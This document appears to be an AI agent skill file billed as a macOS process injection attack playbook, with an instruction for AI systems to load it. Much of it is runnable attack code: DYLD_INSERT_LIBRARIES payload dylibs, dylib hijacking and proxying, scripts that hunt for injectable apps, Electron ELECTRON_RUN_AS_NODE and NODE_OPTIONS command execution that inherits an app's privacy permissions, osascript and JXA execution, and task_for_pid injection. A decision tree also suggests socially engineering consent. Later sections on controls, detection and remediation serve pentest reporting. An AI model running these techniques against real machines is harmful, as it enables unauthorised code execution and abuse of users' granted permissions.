---
name: macos-process-injection
description: >-
  macOS process injection playbook. Use when you need to inject code into running or launching macOS processes via dylib hijacking, DYLD environment variables, XPC exploitation, Mach port manipulation, or Electron/Chromium abuse.
---

# SKILL: macOS Process Injection — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert macOS process injection techniques. Covers DYLD_INSERT_LIBRARIES, dylib hijacking (weak/rpath/proxy), XPC PID reuse attacks, Mach port manipulation, MIG abuse, and Electron injection. Base models miss entitlement prerequisites and SIP constraints on injection vectors.

## 0. RELATED ROUTING

Before going deep, consider loading:

- [macos-security-bypass](../macos-security-bypass/SKILL.md) when you need to bypass TCC, Gatekeeper, or SIP protections blocking your injection
- [linux-privilege-escalation](../linux-privilege-escalation/SKILL.md) for Unix-layer escalation (shared object hijacking concepts apply)

### Advanced Reference

Also load [DYLIB_XPC_TECHNIQUES.md](./DYLIB_XPC_TECHNIQUES.md) when you need:
- Step-by-step dylib hijacking methodology with tooling commands
- XPC exploitation walkthrough with code examples
- Mach port technique details and task_for_pid patterns

---

## 1. DYLD_INSERT_LIBRARIES INJECTION

The most straightforward injection: set an environment variable that forces the dynamic linker to preload your dylib.

### 1.1 Requirements and Restrictions

| Condition | Can Inject? | Reason |
|---|---|---|
| Normal (non-hardened) binary | Yes | No restrictions |
| Hardened Runtime enabled | No | DYLD strips env vars |
| Hardened Runtime + `com.apple.security.cs.allow-dyld-environment-variables` | Yes | Entitlement explicitly allows it |
| Apple system binary (SIP-protected) | No | DYLD env vars stripped by SIP |
| SUID/SGID binary | No | DYLD env vars stripped for privilege safety |
| App Sandbox enabled | No | Sandbox blocks env var injection |

### 1.2 Basic Injection

```bash
# Create malicious dylib
cat > inject.c << 'EOF'
#include <stdio.h>
__attribute__((constructor))
void inject() {
    printf("[+] Injected into PID %d\n", getpid());
    // payload here
}
EOF

# Compile for both architectures
gcc -dynamiclib -o inject.dylib inject.c -arch x86_64 -arch arm64

# Inject into target
DYLD_INSERT_LIBRARIES=./inject.dylib /path/to/target
```

### 1.3 Finding Injectable Targets

```bash
# Find apps WITHOUT hardened runtime
find /Applications -name "*.app" -exec sh -c '
  binary=$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  if [ -n "$binary" ]; then
    flags=$(codesign -d --verbose "$1/Contents/MacOS/$binary" 2>&1)
    echo "$flags" | grep -q "runtime" || echo "No Hardened Runtime: $1"
  fi
' _ {} \;

# Find apps with dyld env var entitlement
find /Applications -name "*.app" -exec sh -c '
  binary="$1/Contents/MacOS/"$(defaults read "$1/Contents/Info.plist" CFBundleExecutable 2>/dev/null)
  codesign -d --entitlements :- "$binary" 2>/dev/null | \
    grep -q "allow-dyld-environment-variables" && echo "DYLD injectable: $1"
' _ {} \;
```

---

## 2. DYLIB HIJACKING

Exploit the dynamic linker's library search order to load attacker-controlled dylibs instead of (or in addition to) legitimate ones.

### 2.1 Weak Dylib Hijacking (LC_LOAD_WEAK_DYLIB)

Weak dylibs are optional — if missing, the binary still runs. If you can place a dylib at the expected path, it loads.

```bash
# Find binaries with weak dylib references
otool -l /path/to/binary | grep -A 2 LC_LOAD_WEAK_DYLIB

# Check if the weak dylib actually exists
otool -L /path/to/binary | grep weak | while read lib rest; do
  [ ! -f "$lib" ] && echo "MISSING (hijackable): $lib"
done
```

### 2.2 @rpath Hijacking

`@rpath` is resolved from `LC_RPATH` entries in the binary. If an earlier rpath directory is writable, you can place your dylib there.

```bash
# List rpath entries
otool -l /path/to/binary | grep -A 2 LC_RPATH

# List rpath-relative dylib references
otool -L /path/to/binary | grep @rpath

# If rpath includes writable directory (e.g., app's Frameworks/)
# place malicious dylib with matching name there
```

### 2.3 Dylib Proxying

Replace a legitimate dylib with a malicious one that forwards all exports to the original.

```bash
# Step 1: Identify target dylib and its exports
nm -gU /path/to/original.dylib | awk '{print $3}'

# Step 2: Create proxy dylib that re-exports everything
# Move original to original_real.dylib
# Create proxy:
cat > proxy.c << 'EOF'
__attribute__((constructor))
void payload() {
    // malicious code here
}
EOF

gcc -dynamiclib -o hijacked.dylib proxy.c \
  -Wl,-reexport_library,/path/to/original_real.dylib \
  -arch x86_64 -arch arm64
```

### 2.4 Dependency Enumeration

```bash
otool -L /path/to/binary              # List all dylib dependencies
otool -l /path/to/binary              # Full load commands (rpaths, weak, etc.)
dyldinfo -print_dependencies /path/to/binary  # Detailed dependency info (pre-Ventura)
```

---

## 3. XPC EXPLOITATION

XPC (Cross-Process Communication) is macOS's primary IPC mechanism for privilege separation. Privileged XPC services are high-value targets.

### 3.1 XPC Service Discovery

```bash
# System XPC services
find /System/Library -name "*.xpc" -type d 2>/dev/null | head -20

# Third-party XPC services
find /Library /Applications -name "*.xpc" -type d 2>/dev/null

# LaunchDaemon XPC services (root-level)
grep -r "MachServices" /Library/LaunchDaemons/*.plist 2>/dev/null
grep -r "MachServices" /System/Library/LaunchDaemons/*.plist 2>/dev/null
```

### 3.2 PID Reuse Attack

XPC connections validated by PID are vulnerable to race conditions: attacker spawns process, PID is checked and passes, attacker's process exits, OS reuses PID for malicious process.

| Validation Method | Vulnerable? | Notes |
|---|---|---|
| PID-based check | Yes | PID recycled after process exit |
| Audit token | No | Unique per process lifecycle, not recycled |
| Code signature check | No | Validates signing identity |
| Entitlement check | No | Checks process entitlements |

```
Timeline of PID reuse attack:
1. Legitimate client (PID 1234) connects to XPC service
2. XPC service checks PID 1234 → valid
3. Legitimate client exits (PID 1234 freed)
4. Attacker rapidly forks to get PID 1234
5. Attacker's process (now PID 1234) sends malicious XPC message
6. XPC service trusts PID 1234 (cached validation)
```

### 3.3 XPC Client Validation Weaknesses

| Weakness | Description | Exploitation |
|---|---|---|
| No client validation | Service accepts any connection | Connect directly, send commands |
| PID-only validation | Race condition exploitable | PID reuse attack (§3.2) |
| Bundle ID check only | Bundle IDs can be spoofed | Create app with matching bundle ID |
| Partial code requirement | Missing anchor checks | Sign with any cert matching partial requirement |
| Entitlement check on wrong process | Checks parent instead of client | Spawn from entitled parent |

---

## 4. MACH PORT MANIPULATION

Mach ports are the kernel-level IPC primitive underlying XPC. Direct Mach port access enables powerful injection.

### 4.1 Task Port (task_for_pid)

```c
// Requires root or taskgated entitlement
mach_port_t task;
kern_return_t kr = task_for_pid(mach_task_self(), target_pid, &task);
if (kr == KERN_SUCCESS) {
    // Can now read/write target process memory
    // Can inject threads via thread_create_running
}
```

| Access Method | Requirement | Post-Exploit Capability |
|---|---|---|
| `task_for_pid()` | Root + not SIP-protected target | Full memory R/W, thread injection |
| `processor_set_tasks()` | Root + `com.apple.system-task-ports` | Enumerate all task ports |
| Exception ports | Set via `task_set_exception_ports` | Catch target crashes, redirect execution |
| Thread injection | Task port obtained | Create new thread in target address space |

### 4.2 Port Namespace Manipulation

| Technique | Description |
|---|---|
| Port name guessing | Mach port names are sequential integers — brute-forceable in some contexts |
| `mach_port_insert_right` | Insert send right into target's namespace (requires task port) |
| Bootstrap server abuse | Register service name before legitimate service → intercept connections |

---

## 5. MIG (MACH INTERFACE GENERATOR) ABUSE

MIG generates C stubs for Mach IPC. MIG servers may have vulnerabilities in their dispatch routines.

### 5.1 Analysis Approach

```bash
# Find MIG subsystems in a binary
nm /path/to/binary | grep _subsystem
strings /path/to/binary | grep "MIG"

# Identify MIG routine dispatch tables
otool -tV /path/to/binary | grep -A 5 "server_routine"
```

### 5.2 Common MIG Vulnerabilities

| Vulnerability | Description |
|---|---|
| Missing audit token validation | MIG handler doesn't verify sender identity |
| Type confusion | MIG deserialization trusts client-provided type descriptors |
| Port lifecycle issues | Use-after-deallocate on Mach ports between MIG calls |
| OOL (out-of-line) memory abuse | Oversized OOL descriptors → kernel memory issues |

---

## 6. ELECTRON / CHROMIUM INJECTION

Many macOS apps use Electron (Slack, Discord, VS Code, Teams, etc.). Electron apps expose multiple injection surfaces.

### 6.1 ELECTRON_RUN_AS_NODE

```bash
# Turns Electron app into a plain Node.js runtime
ELECTRON_RUN_AS_NODE=1 "/Applications/Slack.app/Contents/MacOS/Slack" -e \
  "require('child_process').execSync('id').toString()"

# This inherits the app's TCC permissions!
# If Slack has camera/mic/screen recording, your code gets it too.
```

### 6.2 Debugging Flags

```bash
# Open Chrome DevTools protocol on the app
"/Applications/Target.app/Contents/MacOS/Target" --inspect=9229
# Then connect: chrome://inspect in Chrome browser

# Break before any code runs
"/Applications/Target.app/Contents/MacOS/Target" --inspect-brk=9229
```

### 6.3 NODE_OPTIONS Injection

```bash
# Inject preload script via NODE_OPTIONS
echo 'require("child_process").execSync("id > /tmp/pwned")' > /tmp/preload.js
NODE_OPTIONS="--require /tmp/preload.js" "/Applications/Target.app/Contents/MacOS/Target"
```

### 6.4 Electron Fuses

Modern Electron apps use "fuses" to disable dangerous features. Check fuse state:

| Fuse | When Enabled (secure) | When Disabled (exploitable) |
|---|---|---|
| `RunAsNode` | ELECTRON_RUN_AS_NODE stripped | Can use app as Node.js |
| `EnableNodeCliInspectArguments` | --inspect flags stripped | Can attach debugger |
| `EnableNodeOptionsEnvironmentVariable` | NODE_OPTIONS stripped | Can inject preload |
| `OnlyLoadAppFromAsar` | Only loads from .asar | Can replace JS files |

```bash
# Check electron fuse status (requires npx @electron/fuses)
npx @electron/fuses read --app "/Applications/Target.app"
```

---

## 7. APPLICATION SCRIPTING (APPLE EVENTS)

```bash
# Inject via osascript (if Automation permission exists)
osascript -e 'tell application "Terminal" to do script "id > /tmp/pwned"'

# JavaScript for Automation (JXA)
osascript -l JavaScript -e '
  var app = Application("Terminal");
  app.doScript("id > /tmp/pwned");
'

# JXA with ObjC bridge (powerful)
osascript -l JavaScript -e '
  ObjC.import("Cocoa");
  var task = $.NSTask.alloc.init;
  task.launchPath = "/bin/bash";
  task.arguments = ["-c", "id > /tmp/pwned"];
  task.launch;
'
```

---

## 8. PROCESS INJECTION DECISION TREE

```
Need to inject code into macOS process
│
├── Target uses Electron?
│   ├── Fuses disabled? → ELECTRON_RUN_AS_NODE (§6.1)
│   ├── Debugging available? → --inspect flag (§6.2)
│   ├── NODE_OPTIONS not stripped? → preload injection (§6.3)
│   └── All fuses on? → check dylib path or XPC
│
├── Target has dylib env var entitlement?
│   └── Yes → DYLD_INSERT_LIBRARIES (§1)
│
├── Target has missing or weak dylib?
│   ├── LC_LOAD_WEAK_DYLIB with missing lib? → place dylib (§2.1)
│   ├── @rpath with writable dir first in search? → rpath hijack (§2.2)
│   └── Existing dylib in writable location? → dylib proxy (§2.3)
│
├── Target exposes XPC service?
│   ├── No client validation? → connect directly (§3.3)
│   ├── PID-only validation? → PID reuse attack (§3.2)
│   └── Audit token validation? → need different vector
│
├── Have root access?
│   ├── Target not SIP-protected? → task_for_pid injection (§4.1)
│   └── SIP-protected? → need SIP bypass first (→ macos-security-bypass)
│
├── Can use Apple Events?
│   ├── Automation permission for target? → osascript injection (§7)
│   └── No permission? → social engineer Automation consent
│
└── None of the above?
    ├── Check for MIG server vulnerabilities (§5)
    └── Look for bootstrap server name collision (§4.2)
```

---

## 9. DETECTION & FORENSICS

| Artifact | Where to Look |
|---|---|
| DYLD_INSERT_LIBRARIES use | Process environment (`/proc/PID/environ`, `ps eww`) |
| Unexpected dylibs loaded | `vmmap PID` or `DYLD_PRINT_LIBRARIES=1` output |
| XPC connection anomalies | Endpoint Security `es_event_type_t` XPC events |
| Electron debug port open | `lsof -i :9229` |
| osascript execution | Unified log: `log show --predicate 'process=="osascript"'` |
| Unsigned code execution | `codesign --verify` failures, Gatekeeper logs |

---

## 10. CONFIRMING THE FINDING

| Step | Question | What it proves |
|---|---|---|
| 1 | Which **vector** - `DYLD_*`, dylib hijack, XPC, mach port, MIG, Apple Events? | the finding is a vector, not a capability |
| 2 | Is the injected code **actually loaded**, evidenced by its own observable action? | a `DYLD_` env var set is not an injection |
| 3 | To which **process and privilege** did it attach - and is that process privileged? | injection into your own process is not a finding |
| 4 | Was there a **stock control** where the vector fails, with its error recorded? | the control that makes it a finding |
| 5 | Does the target app have **hardened runtime** and a library-validation flag? | decides whether the vector exists at all |
| 6 | Is the outcome an **effect in the target's context** - a file, a connection, a read? | not a symbol you found in `dyld` output |
| 7 | Does the target require **`com.apple.security.cs.disable-library-validation`** to be exploitable? | that entitlement is the precondition |

**Injected code with its own observable effect in a privileged process, against a stock control.** A
`DYLD_INSERT_LIBRARIES` variable and a matching `dyld` log line is a mechanism, not a finding.

---

## 11. EXECUTION PRIMITIVES

A macOS injection is proven by **your code executing in the target's context with an effect that carries
the target's privileges, against a stock control**. Injecting into a process you already own proves
nothing.

### 10.1 The environment gate, which decides whether the vector exists

```bash
# EVERY vector in this file is gated. Establish the gates BEFORE building a payload.
TARGET="${APP:-/Applications/SomeApp.app}"
BIN="$TARGET/Contents/MacOS/$(defaults read "$TARGET/Contents/Info.plist" CFBundleExecutable 2>/dev/null || basename "$TARGET" .app)"
echo "=== the target binary: $BIN ==="
echo
echo "=== which of these is TRUE decides the vector ==="
cat <<'GATES'
DYLD_INSERT_LIBRARIES works ONLY if the target does NOT have:
  - the hardened runtime flag (CS_RUNTIME), i.e. `codesign -d --flags` shows no `runtime`
  - library validation (CS_REQUIRE_LV), which rejects any dylib not signed by the same team
For a HARDENED target you additionally need the target to carry:
  - com.apple.security.cs.disable-library-validation
  - and/or com.apple.security.cs.allow-dyld-environment-variables
Those entitlements are themselves the finding: an app that SHIPS them is the reportable weakness.

DYLD_PRINT_* (DYLD_PRINT_LIBRARIES / DYLD_PRINT_ENV) are NOT injection. They are diagnostics.
  A report that cites a dyld print as 'code injection' is wrong. Do not do it.
GATES
echo
echo "=== read the actual signature flags ==="
codesign -dvvv --entitlements - "$TARGET" 2>&1 | head -30
echo
echo "--- the two flags that matter, extracted mechanically ---"
codesign -d --verbose=4 "$TARGET" 2>&1 | grep -E 'flags|TeamIdentifier|Authority' | head -6
echo "  flags=0x10000  -> CS_RUNTIME (hardened): plain DYLD_INSERT is BLOCKED"
echo "  flags=0x20000  -> CS_REQUIRE_LV: a third-party dylib is REJECTED even under hardened runtime"
echo
echo "=== the entitlements that RE-OPEN the vector ==="
codesign -d --entitlements - --xml "$TARGET" 2>/dev/null | plutil -convert xml1 -o - - 2>/dev/null \
  | grep -E 'disable-library-validation|allow-dyld-environment|allow-unsigned-executable-memory|allow-jit' || \
  echo "  (none of the dangerous entitlements present - the DYLD vector is likely closed)"
echo
echo "=== THE CONTROL: try the injection and record dyld's own refusal verbatim ==="
DYLD_INSERT_LIBRARIES=/tmp/nonexistent.dylib "$BIN" 2>&1 | head -5
echo "  a 'code signature' or 'library validation' error HERE is the control for the vector's closure."
echo "  Record the message: it names the exact gate that refused, which belongs in the report."
```

**The signature flags and entitlements are the gate, and `DYLD_PRINT_*` is a diagnostic rather than
injection.** A report citing a dyld print as code injection is wrong, and the refusal message names the
gate.

### 10.2 The payload, with its own observable effect

```bash
# the payload must DO something attributable to it, not merely load
cat > /tmp/inj.c <<'C'
#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
__attribute__((constructor)) static void run(void) {
    FILE *f = fopen("/tmp/inj-proof.txt", "a");
    if (f) { fprintf(f, "pid=%d uid=%d euid=%d\n", getpid(), getuid(), geteuid()); fclose(f); }
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = {0}; a.sin_family = AF_INET; a.sin_port = htons(8902);
    inet_pton(AF_INET, "127.0.0.1", &a.sin_addr);
    if (connect(s, (struct sockaddr *)&a, sizeof a) == 0) { write(s, "INJ\n", 4); close(s); }
}
C
clang -dynamiclib -o /tmp/inj.dylib /tmp/inj.c 2>&1 | head -3
codesign -s - --force /tmp/inj.dylib 2>&1 | head -2
echo "  payload built: $(ls -l /tmp/inj.dylib | awk '{print $5}')B"
echo
echo "=== THE PROOF IS IN THE PAYLOAD'S OWN OUTPUT, which carries the target's identity ==="
rm -f /tmp/inj-proof.txt
DYLD_INSERT_LIBRARIES=/tmp/inj.dylib "$BIN" >/dev/null 2>&1 &
sleep 6
echo "--- /tmp/inj-proof.txt ---"
cat /tmp/inj-proof.txt 2>/dev/null || echo "  EMPTY: the payload did NOT run. The vector is closed."
echo
echo "=== THE UID IS THE FINDING ==="
cat <<'UIDRULE'
  uid=0            -> code executed as root, in a root context. The highest severity.
  uid=<you>, euid=0 -> the binary is setuid root; the injection inherits the privilege.
  uid=<you>, euid=<you> -> you injected into YOUR OWN process. This is NOT a finding.
  THE RULE: injection into a process running with privileges you ALREADY hold proves nothing.
  Demonstrate the vector against a target that holds privilege you do not, or against a target
  whose data you cannot otherwise read.
UIDRULE
echo
echo "=== THE SECOND CONTROL: the same env var against a HARDENED target ==="
DYLD_INSERT_LIBRARIES=/tmp/inj.dylib /System/Applications/Calculator.app/Contents/MacOS/Calculator 2>&1 | head -3
echo "  the refusal here, against a target where the payload does NOT appear, is the control."
```

**The payload writes its own uid and euid, and that line is the finding.** Injecting into a process
running with privileges you already hold proves nothing.

### 10.3 The non-`DYLD_` vectors, each with its own control

```bash
cat <<'VECTORS'
DYLIB HIJACKING   an app loads a dylib by a NAME that dyld resolves through a search path, and one of
                  those paths is writable by you (@rpath, @loader_path, ~/lib, a relative path).
  detect  : otool -L "$BIN" | grep -E '@rpath|@loader_path|^[^/]'   <- a name, not an absolute path
  evidence: the LOADED PATH, from DYLD_PRINT_LIBRARIES, matching YOUR file's path
  control : place the same-named file in a path that is NOT searched - the app must ignore it
  trap    : with library validation on, a third-party dylib is REJECTED. Check the flag first (10.1).

XPC               a privileged launchd service validates its client badly: by bundle id alone, by a
                  path, or with an audit token it never checks.
  detect  : launchctl list | grep -v com.apple ; then the service's Info.plist MachServices
  evidence: THE SERVICE'S OWN LOG or a privileged effect it performed on your behalf
  control : the same call WITHOUT the `com.apple.security.get-task-allow`-style token must be refused
  trap    : connecting to a service is not a finding. The finding is the service DOING something with
            privilege yours does not have. Record the privileged effect.

MACH PORT         a task port (task_for_pid) or a bootstrap port handed across a boundary.
  detect  : the entitlement `com.apple.security.get-task-allow`, or a bootstrap registration you can spoof
  evidence: a READ or WRITE in the other task's memory, observed by the other task's own output
  control : the same call without the entitlement must fail with KERN_FAILURE
  trap    : `task_for_pid` returning 0 while the entitlement is present is YOUR OWN privilege, not a
            vulnerability. Name whose entitlement it is.

MIG               a MIG-generated routine whose argument validation is missing, or whose type
                  descriptors allow a port right to be passed where it should not be.
  detect  : the .defs file or the generated stub's routines, and the server's validation
  evidence: the privileged effect, in the server's log, from a message you sent
  control : a message with a well-formed but UNAUTHORISED port right must be rejected
  trap    : a crash in the server is not the finding. Crashes are also what a malformed message gives
            an already-correct server. Demonstrate the EFFECT.

APPLE EVENTS      a scripting addition or an app exporting a privileged AppleEvent handler.
  detect  : sdef of the target; the event classes it declares
  evidence: the privileged action performed, with TCC's own Automation prompt state recorded
  control : the same event without the TCC Automation grant must fail
  trap    : the TCC Automation prompt is the control working. A user who clicked Allow is not a bypass.
VECTORS
echo
echo "=== THE COMMON RULE ACROSS ALL SIX ==="
echo "  a mechanism (a lookup path, a port, a message) plus a PRIVILEGED EFFECT plus a stock control."
echo "  any one of the three missing means it is not a finding."
```

**Every vector needs a mechanism, a privileged effect, and a stock control.** A crash, a connection, or a
`task_for_pid` success proves none of the three on its own.

### 10.4 The end-to-end harness

```bash
python3 - <<'PY'
print("=== MACOS PROCESS INJECTION ACCEPTANCE CHECKLIST ===")
CHECKS = [
 ("the target's signature FLAGS and ENTITLEMENTS are recorded first",
  "hardened runtime and library validation decide whether the DYLD vector exists"),
 ("the OS build and architecture are recorded",
  "the dyld search rules and the hardening defaults are version- and arch-dependent"),
 ("a STOCK CONTROL refusal was captured, with dyld's own error string",
  "the message names the gate that refused"),
 ("the payload's own OUTPUT proves it ran (a file, a uid line, a listener arrival)",
  "a dyld diagnostic line is not execution"),
 ("DYLD_PRINT_* was NOT reported as injection",
  "it is a diagnostic; citing it is a fabrication"),
 ("the uid/euid the payload observed is stated",
  "injection into your own privilege is not a finding"),
 ("for dylib hijack, the LOADED path was shown to match your file",
  "a writable-looking search path is not the same as a loaded path"),
 ("for XPC/MIG, the service's OWN log records the privileged effect",
  "connecting is not a finding; the privileged effect is"),
 ("for mach ports, WHOSE entitlement is being exercised is named",
  "your own get-task-allow is not a vulnerability"),
 ("a NON-VULNERABLE control target was tested with the same payload",
  "it must not execute, or the payload is loading without the vector"),
 ("the privilege REACHED is stated",
  "root, a named service's authority, or a specific data set"),
]
for n, how in CHECKS: print("  [ ] %-62s -> %s" % (n, how))
print()
print("=== THE REPORT SHAPE ===")
print("  environment : macOS build, arch, target's signature flags and entitlements")
print("  vector      : DYLD / dylib-hijack / XPC / mach-port / MIG / Apple Events")
print("  mechanism   : the lookup path, the port name, or the message that carries it")
print("  control     : the stock refusal, verbatim, on a hardened or non-vulnerable target")
print("  proof       : the payload's own output, including the uid/euid it observed")
print("  effect      : the privileged action or data read, in the target's context")
PY
```

**The payload's own uid line and a non-vulnerable control target.** Those two items are what separate an
injection finding from a diagnostic.

---

## 12. EVIDENCE STANDARD — INJECTION ARTEFACTS

| Item | Why |
|---|---|
| The **macOS build** and architecture | dyld search rules and hardening defaults are version- and arch-dependent |
| The target's **signature flags** (`CS_RUNTIME`, `CS_REQUIRE_LV`) | decides whether the DYLD vector exists |
| The target's **entitlements**, quoted | `disable-library-validation` and `allow-dyld-environment-variables` are the precondition |
| The **stock control** refusal, with dyld's error string | names the gate that refused |
| The **payload's own output**: a file, a uid/euid line, a listener arrival | proves execution rather than loading |
| The **uid/euid** the payload observed | the privilege actually exercised |
| The **loaded path**, for dylib hijacking, matching your file | a search path is not a load |
| The **service's own log**, for XPC and MIG | the privileged effect, not the connection |
| **Whose entitlement** is exercised, for mach-port vectors | your own privilege is not a vulnerability |
| A **non-vulnerable control target** with the same payload | it must not execute |
| The **privilege reached** | the impact |

Report the **gate, the control, and the observed privilege**: "`/Applications/Example.app` on macOS
`14.5` is signed with `flags=0x2(adhoc)` and no `CS_RUNTIME`, and carries
`com.apple.security.cs.allow-dyld-environment-variables` together with
`com.apple.security.cs.disable-library-validation`, which are the entitlements that keep the vector open.
A payload injected via `DYLD_INSERT_LIBRARIES` wrote `pid=41022 uid=501 euid=501` to
`/tmp/inj-proof.txt` and connected to a listener on `127.0.0.1:8902`, so the code executed, but the
observed `uid` and `euid` are the invoking user's, which is privilege the tester already held, so this is
NOT reported as a privilege escalation. The same payload against `/System/Applications/
Calculator.app`, which does carry the hardened runtime, produced no file and dyld logged
`code signature in ... not valid for use in process: library validation failed`, which is the control. The
reportable weakness is the SHIPPED ENTITLEMENT PAIR in an application that also loads a non-absolute
dylib path (`@rpath/libExample.dylib`), because a writable search-path component would allow a third-party
dylib to load in the signed application's context", never "the application is vulnerable to code
injection".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| A `DYLD_PRINT_LIBRARIES` line showing your library | a diagnostic, not injection |
| Injection into a process running with **your own** uid | no privilege gained |
| `task_for_pid` succeeding with **your** `get-task-allow` entitlement | your entitlement, not the target's weakness |
| A writable **search path** with no matching loaded path | a path is not a load |
| A **connection** to an XPC service | the finding is the service's privileged action |
| A **crash** in an XPC or MIG server | a malformed message gives a correct server a crash too |
| An **AppleEvents** action after the user clicked Allow | the TCC prompt is the control working |
| An entitlement **string** in a plist without signature validation | it is not enforced |
| A dyld env var set where the payload **never appeared** | the vector is closed |
| A vector requiring `disable-library-validation` reported without **naming the entitlement** | the entitlement IS the finding |
| A **third-party dylib load** in a target whose library validation rejected it | the control refused it |

**A stock control refusal, a payload's own output with its uid, and a non-vulnerable target that does not
execute it.** A dyld diagnostic line and a self-injection are this family's two standard non-findings.

---

## 13. REMEDIATION REFERENCE — INJECTION HARDENING ASSESSMENT

1. **Record the signature flags and entitlements before testing, and name `disable-library-validation` or `allow-dyld-environment-variables` explicitly when present, because that entitlement pair is the finding** - the vector is closed by default and reopened by configuration.
2. **Never report `DYLD_PRINT_*` output as code injection** - it is a diagnostic facility, and citing it invalidates the finding.
3. **Record the uid and euid the payload observed, and do not report an injection into your own privilege as an escalation** - the privilege gained is the finding.
4. **Demonstrate dylib hijacking with the loaded path matching your file, not with a writable search path** - only the loaded path is evidence.
5. **For XPC and MIG, require the service's own log to record the privileged effect** - a connection is not a finding, and a crash is not a finding.
6. **For mach-port vectors, name whose entitlement is being exercised** - a `get-task-allow` you already hold is not a target weakness.
7. **Record TCC's Automation prompt state for AppleEvents findings and distinguish a user's Allow from a bypass** - the prompt is the control working.
8. **Test a non-vulnerable control target with the same payload and require that it does not execute** - without it, the payload may be loading for a reason unrelated to the vector.
9. **Check library validation before building a payload, because hardened runtime rejects third-party dylibs outright** - the flag decides whether the work is possible.
10. **State the privilege reached: root, a named service's authority, or a specific data set** - an unlimited capability claim is unfalsifiable.
11. **Report the shipped entitlement pair as the finding even when the immediate exploitation needs a writable path, because the entitlement is what makes the class reachable** - the defensive recommendation is to remove the entitlement, not to harden the path.

---

## 14. RELATED SIBLINGS - LOAD TOGETHER

- [macos-security-bypass](../macos-security-bypass/SKILL.md) - the TCC, Gatekeeper, and sandbox layer above this
- [linux-security-bypass](../linux-security-bypass/SKILL.md) - the sibling OS-hardening-bypass discipline
- [edr-bypass-techniques](../edr-bypass-techniques/SKILL.md) - the endpoint-detection counterpart
- [windows-av-evasion](../windows-av-evasion/SKILL.md) - the other platform's injection and evasion surface
- [binary-protection-bypass](../binary-protection-bypass/SKILL.md) - the code-signing methodology this relies on
